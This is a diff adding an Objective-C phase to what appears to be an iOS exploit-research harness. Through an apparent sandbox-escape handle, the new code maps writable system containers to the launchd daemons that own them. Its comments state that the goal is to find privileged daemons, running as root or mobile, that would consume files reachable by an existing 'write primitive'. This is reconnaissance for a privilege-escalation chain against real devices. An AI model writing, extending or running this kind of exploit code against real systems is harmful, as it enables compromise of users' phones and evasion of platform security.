@@ -26142,6 +26142,175 @@ static void p_bq7(void) {
 }
 
 // ---------------------------------------------------------------------------
+// V175 (p_bq8): map every writable container to its owning daemon.
+//
+// §175 proved W-open across 23 system containers, §177 identified one
+// consumer by grepping launchd for a filename. This phase closes the loop
+// systematically: for EACH container, read its MCMMetadataIdentifier
+// (§170's method), then grep all 661 launchd plists for (a) those
+// identifiers and (b) the writable filenames found in §175. The output is
+// the table the write primitive has been missing: file -> container owner
+// -> daemon definition ( UserName, triggers, program ). Only daemons we
+// can name can be reasoned about as consumers; the rest of the writable
+// set is just bytes.
+//
+// Read-only: metadata plists and launchd plists, nothing else, no writes.
+// ---------------------------------------------------------------------------
+
+static void p_bq8(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq8] v175 owner map: container identifiers + launchd grep (read-only)");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq8] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { return; }
+
+    // ---- 1. UUID -> MCMMetadataIdentifier for every container.
+    NSMutableArray *idents = [NSMutableArray array];
+    NSMutableArray *uuids = [NSMutableArray array];
+    {
+        DIR *top = opendir("/var/containers/Data/System");
+        struct dirent *e;
+        while (top && (e = readdir(top))) {
+            if (e->d_name[0] == '.') continue;
+            char mp[1200];
+            snprintf(mp, sizeof(mp),
+                     "/var/containers/Data/System/%s/"
+                     ".com.apple.mobile_container_manager.metadata.plist",
+                     e->d_name);
+            NSData *md = [NSData dataWithContentsOfFile:
+                [NSString stringWithUTF8String:mp] options:0 error:nil];
+            if (md.length == 0) {
+                // 0 bytes for EVERY container is a detector failure, not a
+                // fact about the system (§144): the same files were listed
+                // in §170. errno says which — ENOENT means the metadata
+                // scheme moved, EPERM means the extension does not cover it.
+                errno = 0;
+                int fdr = open(mp, O_RDONLY);
+                int oerr = fdr < 0 ? errno : 0;
+                if (fdr >= 0) close(fdr);
+                LOG("[bq8]   %-40s metadata: unreadable, open errno %d%s",
+                    e->d_name, oerr,
+                    oerr == 2 ? " (ENOENT — scheme moved, name must be discovered)"
+                              : oerr == 1 ? " (EPERM — extension does not cover dotfiles?)"
+                                          : "");
+                continue;
+            }
+            CFPropertyListRef pl = CFPropertyListCreateWithData(
+                kCFAllocatorDefault, (__bridge CFDataRef)md, 0, NULL, NULL);
+            NSDictionary *dict = pl && [(__bridge id)pl isKindOfClass:[NSDictionary class]]
+                ? (__bridge NSDictionary *)pl : nil;
+            NSString *ident = [[dict objectForKey:@"MCMMetadataIdentifier"]
+                isKindOfClass:[NSString class]] ? [dict objectForKey:@"MCMMetadataIdentifier"] : nil;
+            LOG("[bq8]   %-40s -> %s", e->d_name, ident ? ident.UTF8String : "(no identifier)");
+            if (ident) { [idents addObject:ident]; [uuids addObject:
+                [NSString stringWithUTF8String:e->d_name]]; }
+            if (pl) CFRelease(pl);
+        }
+        if (top) closedir(top);
+        LOG("[bq8] identifiers collected: %d of %d containers",
+            (int)idents.count, (int)uuids.count);
+        fsync(fileno(stderr));
+    }
+
+    // ---- 2. Grep launchd (all three readable locations) for identifiers
+    // and for the writable filenames §175 found. Both directions matter:
+    // identifier-hits say "this daemon owns that container", filename-hits
+    // say "this daemon names that file".
+    {
+        NSMutableArray *needles = [NSMutableArray arrayWithArray:idents];
+        [needles addObjectsFromArray:@[
+            @"ReportCrash", @"HangTracer", @"PerfPowerServices",
+            @"SpaceAttribution", @"SpinTracer", @"database.sqlite",
+            @"appintents", @"SUS_History", @"katana", @"distributor-preferences",
+            @"AppProtection", @"DefaultAppQueryState", @"adi.pb", @"btjm",
+            @"db-wal", @"geod",
+        ]];
+        const char *dirs[] = { "/System/Library/LaunchDaemons",
+                               "/System/Library/LaunchAgents" };
+        NSMutableArray *hitPlists = [NSMutableArray array]; // full text of matched plists
+        for (unsigned di = 0; di < 2; di++) {
+            DIR *d = opendir(dirs[di]);
+            if (!d) { LOG("[bq8] %s: opendir errno %d", dirs[di], errno); continue; }
+            struct dirent *e;
+            int files = 0, hits = 0;
+            while ((e = readdir(d))) {
+                if (e->d_name[0] == '.') continue;
+                char p[1024];
+                snprintf(p, sizeof(p), "%s/%s", dirs[di], e->d_name);
+                NSData *dd = [NSData dataWithContentsOfFile:
+                    [NSString stringWithUTF8String:p] options:0 error:nil];
+                if (dd.length == 0) continue;
+                files++;
+                NSString *s = [[NSString alloc] initWithData:dd
+                    encoding:NSUTF8StringEncoding];
+                if (!s) continue;
+                NSMutableArray *who = [NSMutableArray array];
+                for (NSString *nd in needles)
+                    if ([s rangeOfString:nd options:NSCaseInsensitiveSearch].location
+                            != NSNotFound) [who addObject:nd];
+                if (who.count) {
+                    LOG("[bq8]   HIT %s/%s <- [%s]", dirs[di], e->d_name,
+                        [[who componentsJoinedByString:@", "] UTF8String]);
+                    [hitPlists addObject:s];
+                    hits++;
+                }
+            }
+            closedir(d);
+            LOG("[bq8] %s: %d plists, %d hits", dirs[di], files, hits);
+            fsync(fileno(stderr));
+        }
+
+        // ---- 3. For each matched daemon print the definition fields that
+        // decide whether it is a usable consumer: UserName (mobile? root?),
+        // Program, MachServices, LaunchEvents triggers. The full plist was
+        // printed for softposreaderd in §175; here only the decision fields,
+        // parsed from XML lines — enough to rank candidates, and the file
+        // text is on disk in the app container if a daemon needs a full
+        // read later.
+        for (NSString *s in hitPlists) {
+            NSString *label = nil, *user = nil, *prog = nil;
+            NSArray *lines = [s componentsSeparatedByString:@"\n"];
+            for (NSUInteger i = 0; i < lines.count; i++) {
+                NSString *ln = lines[i];
+                NSString *(^next)(void) = ^NSString *{
+                    for (NSUInteger j = i + 1; j < lines.count; j++) {
+                        NSString *t = [lines[j] stringByTrimmingCharactersInSet:
+                            [NSCharacterSet whitespaceCharacterSet]];
+                        if ([t hasPrefix:@"<string>"]) return t;
+                    }
+                    return nil;
+                };
+                if ([ln rangeOfString:@"<key>Label</key>"].location != NSNotFound) {
+                    NSString *v = next();
+                    label = [[v stringByReplacingOccurrencesOfString:@"<string>" withString:@""]
+                        stringByReplacingOccurrencesOfString:@"</string>" withString:@""];
+                } else if ([ln rangeOfString:@"<key>UserName</key>"].location != NSNotFound) {
+                    NSString *v = next();
+                    user = [[v stringByReplacingOccurrencesOfString:@"<string>" withString:@""]
+                        stringByReplacingOccurrencesOfString:@"</string>" withString:@""];
+                } else if ([ln rangeOfString:@"<key>Program</key>"].location != NSNotFound) {
+                    NSString *v = next();
+                    prog = [[v stringByReplacingOccurrencesOfString:@"<string>" withString:@""]
+                        stringByReplacingOccurrencesOfString:@"</string>" withString:@""];
+                }
+            }
+            LOG("[bq8]   daemon %-44s user=%-8s prog=%s",
+                label ? label.UTF8String : "?",
+                user ? user.UTF8String : "(root)",
+                prog ? prog.UTF8String : "(embedded/other key)");
+        }
+        fsync(fileno(stderr));
+    }
+
+    bad_query_release(h);
+    LOG("[bq8] done");
+}
+
+// ---------------------------------------------------------------------------
 // V171 (p_netv6): the kernel network surface §146 could not reach, asked
 // through the sockets an app is actually allowed to create.
 //
@@ -30635,6 +30804,7 @@ void *t_iosurface_scaler(void *arg) {
             p_bq6(); LOG("[probe13] bq6-only mode, stop"); return NULL;
         }
         if (getenv("FUZZ_BQ7")) { p_bq7(); LOG("[probe13] bq7-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ8")) { p_bq8(); LOG("[probe13] bq8-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MDNS")) { p_mdns(); LOG("[probe13] mdns-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC2")) { p_lsvc(); p_ipopt(); LOG("[probe13] lsvc2-only mode, stop"); return NULL; }
